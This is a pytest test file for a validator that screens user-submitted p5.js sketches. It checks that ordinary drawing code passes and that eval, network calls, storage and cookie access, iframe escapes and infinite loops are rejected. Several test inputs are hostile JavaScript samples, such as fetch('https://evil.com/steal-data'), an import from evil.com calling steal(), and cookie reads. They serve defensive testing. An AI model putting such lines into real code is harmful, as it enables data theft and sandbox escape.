# tests/unit/test_sandbox.py - Sandbox security tests using pytest
"""
Unit tests for the sandbox validation and security features.

Tests cover:
- Safe code validation
- Dangerous pattern blocking
- Infinite loop detection
- Configuration defaults
"""

import pytest
from sandbox import CodeValidator, SandboxConfig


@pytest.mark.unit
@pytest.mark.sandbox
class TestSafeCodeValidation:
    """Tests for safe p5.js code validation."""
    
    def test_simple_setup_draw_passes(self):
        """Test that simple p5.js code passes validation."""
        validator = CodeValidator()
        
        safe_code = """
function setup() {
    createCanvas(400, 400);
    background(220);
}

function draw() {
    ellipse(50, 50, 80, 80);
}
"""
        is_valid, violations = validator.validate(safe_code)
        assert is_valid, f"Safe code should pass, got violations: {violations}"
    
    def test_p5_js_functions_allowed(self):
        """Test that standard p5.js functions are allowed."""
        validator = CodeValidator()
        
        p5_code = """
function setup() {
    createCanvas(800, 600);
    background(255);
    fill(200, 100, 50);
    stroke(0);
    strokeWeight(2);
}

function draw() {
    rect(100, 100, 200, 150);
    ellipse(400, 300, 100, 100);
    line(0, 0, width, height);
    
    let x = random(0, width);
    let y = map(mouseY, 0, height, 0, 255);
}
"""
        is_valid, violations = validator.validate(p5_code)
        assert is_valid, f"p5.js code should pass: {violations}"
    
    def test_empty_code_passes(self):
        """Test that empty code passes validation."""
        validator = CodeValidator()
        is_valid, violations = validator.validate("")
        assert is_valid
        
        is_valid, violations = validator.validate("   ")
        assert is_valid
    
    def test_code_with_comments_passes(self):
        """Test that code with comments is allowed."""
        validator = CodeValidator()
        
        code_with_comments = """
// This is a comment
function setup() {
    /* Multi-line
       comment */
    createCanvas(400, 400);
}
"""
        is_valid, violations = validator.validate(code_with_comments)
        assert is_valid, f"Code with comments should pass: {violations}"


@pytest.mark.unit
@pytest.mark.sandbox
class TestDangerousPatternBlocking:
    """Tests for blocking dangerous JavaScript patterns."""
    
    def test_eval_blocked(self):
        """Test that eval() is blocked."""
        validator = CodeValidator()
        
        malicious_code = """
function setup() {
    eval("createCanvas(400, 400)");
}
"""
        is_valid, violations = validator.validate(malicious_code)
        assert not is_valid, "eval() should be blocked"
        assert any("eval" in v for v in violations), "Should report eval violation"
    
    def test_function_constructor_blocked(self):
        """Test that Function constructor is blocked."""
        validator = CodeValidator()
        
        malicious_code = """
var fn = new Function('return 1');
"""
        is_valid, violations = validator.validate(malicious_code)
        assert not is_valid, "Function constructor should be blocked"
    
    def test_settimeout_string_blocked(self):
        """Test that setTimeout with string is blocked."""
        validator = CodeValidator()
        
        malicious_code = """
setTimeout("alert('hi')", 1000);
"""
        is_valid, violations = validator.validate(malicious_code)
        assert not is_valid, "setTimeout with string should be blocked"
    
    def test_setinterval_string_blocked(self):
        """Test that setInterval with string is blocked."""
        validator = CodeValidator()
        
        malicious_code = """
setInterval("console.log('tick')", 1000);
"""
        is_valid, violations = validator.validate(malicious_code)
        assert not is_valid, "setInterval with string should be blocked"
    
    def test_import_blocked(self):
        """Test that dynamic import() is blocked."""
        validator = CodeValidator()
        
        malicious_code = """
import('https://evil.com/module.js').then(m => m.steal());
"""
        is_valid, violations = validator.validate(malicious_code)
        assert not is_valid, "Dynamic import should be blocked"
    
    def test_worker_blocked(self):
        """Test that Web Workers are blocked."""
        validator = CodeValidator()
        
        malicious_code = """
var worker = new Worker('worker.js');
"""
        is_valid, violations = validator.validate(malicious_code)
        assert not is_valid, "Web Workers should be blocked"


@pytest.mark.unit
@pytest.mark.sandbox
class TestNetworkBlocking:
    """Tests for blocking network operations."""
    
    def test_fetch_blocked(self):
        """Test that fetch() is blocked."""
        validator = CodeValidator()
        
        malicious_code = """
function setup() {
    fetch('https://evil.com/steal-data');
}
"""
        is_valid, violations = validator.validate(malicious_code)
        assert not is_valid, "fetch() should be blocked"
    
    def test_xmlhttprequest_blocked(self):
        """Test that XMLHttpRequest is blocked."""
        validator = CodeValidator()
        
        malicious_code = """
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://evil.com');
"""
        is_valid, violations = validator.validate(malicious_code)
        assert not is_valid, "XMLHttpRequest should be blocked"
    
    def test_websocket_blocked(self):
        """Test that WebSocket is blocked."""
        validator = CodeValidator()
        
        malicious_code = """
var ws = new WebSocket('wss://evil.com');
"""
        is_valid, violations = validator.validate(malicious_code)
        assert not is_valid, "WebSocket should be blocked"
    
    def test_open_blocked(self):
        """Test that window.open is blocked."""
        validator = CodeValidator()
        
        malicious_code = """
open('https://evil.com');
"""
        is_valid, violations = validator.validate(malicious_code)
        assert not is_valid, "window.open should be blocked"


@pytest.mark.unit
@pytest.mark.sandbox
class TestStorageBlocking:
    """Tests for blocking storage access."""
    
    def test_localstorage_blocked(self):
        """Test that localStorage is blocked."""
        validator = CodeValidator()
        
        malicious_code = """
localStorage.setItem('key', 'value');
"""
        is_valid, violations = validator.validate(malicious_code)
        assert not is_valid, "localStorage should be blocked"
    
    def test_sessionstorage_blocked(self):
        """Test that sessionStorage is blocked."""
        validator = CodeValidator()
        
        malicious_code = """
sessionStorage.getItem('secret');
"""
        is_valid, violations = validator.validate(malicious_code)
        assert not is_valid, "sessionStorage should be blocked"
    
    def test_indexeddb_blocked(self):
        """Test that indexedDB is blocked."""
        validator = CodeValidator()
        
        malicious_code = """
var request = indexedDB.open('mydb');
"""
        is_valid, violations = validator.validate(malicious_code)
        assert not is_valid, "indexedDB should be blocked"
    
    def test_document_cookie_blocked(self):
        """Test that document.cookie is blocked."""
        validator = CodeValidator()
        
        malicious_code = """
var cookies = document.cookie;
"""
        is_valid, violations = validator.validate(malicious_code)
        assert not is_valid, "document.cookie should be blocked"
    
    def test_document_write_blocked(self):
        """Test that document.write is blocked."""
        validator = CodeValidator()
        
        malicious_code = """
document.write('<script>alert(1)</script>');
"""
        is_valid, violations = validator.validate(malicious_code)
        assert not is_valid, "document.write should be blocked"


@pytest.mark.unit
@pytest.mark.sandbox
class TestIframeEscapeBlocking:
    """Tests for blocking iframe escape attempts."""
    
    def test_parent_access_blocked(self):
        """Test that parent access is blocked."""
        validator = CodeValidator()
        
        malicious_code = """
parent.location.href = 'https://evil.com';
"""
        is_valid, violations = validator.validate(malicious_code)
        assert not is_valid, "parent access should be blocked"
    
    def test_top_access_blocked(self):
        """Test that top access is blocked."""
        validator = CodeValidator()
        
        malicious_code = """
top.location = 'https://evil.com';
"""
        is_valid, violations = validator.validate(malicious_code)
        assert not is_valid, "top access should be blocked"
    
    def test_location_access_blocked(self):
        """Test that location access is blocked."""
        validator = CodeValidator()
        
        malicious_code = """
location.href = 'https://evil.com';
"""
        is_valid, violations = validator.validate(malicious_code)
        assert not is_valid, "location access should be blocked"


@pytest.mark.unit
@pytest.mark.sandbox
class TestInfiniteLoopDetection:
    """Tests for infinite loop detection."""
    
    def test_while_true_blocked(self):
        """Test that while(true) is detected."""
        validator = CodeValidator()
        
        loop_code = """
while (true) {
    console.log('stuck');
}
"""
        is_valid, violations = validator.validate(loop_code)
        assert not is_valid, "while(true) should be detected"
        assert any("infinite loop" in v.lower() for v in violations)
    
    def test_while_1_blocked(self):
        """Test that while(1) is detected."""
        validator = CodeValidator()
        
        loop_code = """
while (1) {
    doSomething();
}
"""
        is_valid, violations = validator.validate(loop_code)
        assert not is_valid, "while(1) should be detected"
    
    def test_for_ever_blocked(self):
        """Test that for(;;) is detected."""
        validator = CodeValidator()
        
        loop_code = """
for (;;) {
    console.log('forever');
}
"""
        is_valid, violations = validator.validate(loop_code)
        assert not is_valid, "for(;;) should be detected"
    
    def test_normal_while_allowed(self):
        """Test that normal while loops are allowed."""
        validator = CodeValidator()
        
        code = """
let i = 0;
while (i < 10) {
    i++;
}
"""
        is_valid, violations = validator.validate(code)
        assert is_valid, f"Normal while loop should be allowed: {violations}"
    
    def test_normal_for_loop_allowed(self):
        """Test that normal for loops are allowed."""
        validator = CodeValidator()
        
        code = """
for (let i = 0; i < 10; i++) {
    console.log(i);
}
"""
        is_valid, violations = validator.validate(code)
        assert is_valid, f"Normal for loop should be allowed: {violations}"


@pytest.mark.unit
@pytest.mark.sandbox
class TestSanitizeMethod:
    """Tests for the sanitize() method."""
    
    def test_sanitize_returns_code_on_valid(self):
        """Test that sanitize returns code when valid."""
        validator = CodeValidator()
        
        code = "function setup() { createCanvas(400, 400); }"
        result = validator.sanitize(code)
        assert result == code
    
    def test_sanitize_raises_on_invalid(self):
        """Test that sanitize raises ValueError for invalid code."""
        validator = CodeValidator()
        
        with pytest.raises(ValueError) as exc_info:
            validator.sanitize("eval('alert(1)')")
        
        assert "validation failed" in str(exc_info.value).lower()
    
    def test_sanitize_includes_violations_in_error(self):
        """Test that error message includes violation details."""
        validator = CodeValidator()
        
        with pytest.raises(ValueError) as exc_info:
            validator.sanitize("eval('test')")
        
        error_msg = str(exc_info.value)
        assert "blocked" in error_msg.lower() or "eval" in error_msg.lower()


@pytest.mark.unit
@pytest.mark.sandbox
class TestSandboxConfig:
    """Tests for SandboxConfig defaults."""
    
    def test_default_execution_time(self):
        """Test default max execution time."""
        config = SandboxConfig()
        assert config.max_execution_time_ms == 5000
    
    def test_default_max_iterations(self):
        """Test default max iterations."""
        config = SandboxConfig()
        assert config.max_iterations == 100000
    
    def test_default_memory_limit(self):
        """Test default memory limit."""
        config = SandboxConfig()
        assert config.max_memory_mb == 100
    
    def test_default_network_disabled(self):
        """Test that network is disabled by default."""
        config = SandboxConfig()
        assert config.enable_network is False
    
    def test_default_storage_disabled(self):
        """Test that storage is disabled by default."""
        config = SandboxConfig()
        assert config.enable_storage is False
    
    def test_default_allowed_domains_empty(self):
        """Test that allowed domains list is empty by default."""
        config = SandboxConfig()
        assert config.allowed_domains == []
    
    def test_config_values_can_be_modified(self):
        """Test that config values can be changed."""
        config = SandboxConfig()
        config.max_execution_time_ms = 10000
        config.enable_network = True
        
        assert config.max_execution_time_ms == 10000
        assert config.enable_network is True


@pytest.mark.unit
@pytest.mark.sandbox
class TestCaseInsensitiveBlocking:
    """Tests that blocking is case-insensitive."""
    
    def test_eval_case_insensitive(self):
        """Test that EVAL is also blocked."""
        validator = CodeValidator()
        
        for code in ["EVAL('test')", "Eval('test')", "eVaL('test')"]:
            is_valid, violations = validator.validate(code)
            assert not is_valid, f"{code} should be blocked"
    
    def test_fetch_case_insensitive(self):
        """Test that FETCH is also blocked."""
        validator = CodeValidator()
        
        for code in ["FETCH('url')", "Fetch('url')", "fEtCh('url')"]:
            is_valid, violations = validator.validate(code)
            assert not is_valid, f"{code} should be blocked"
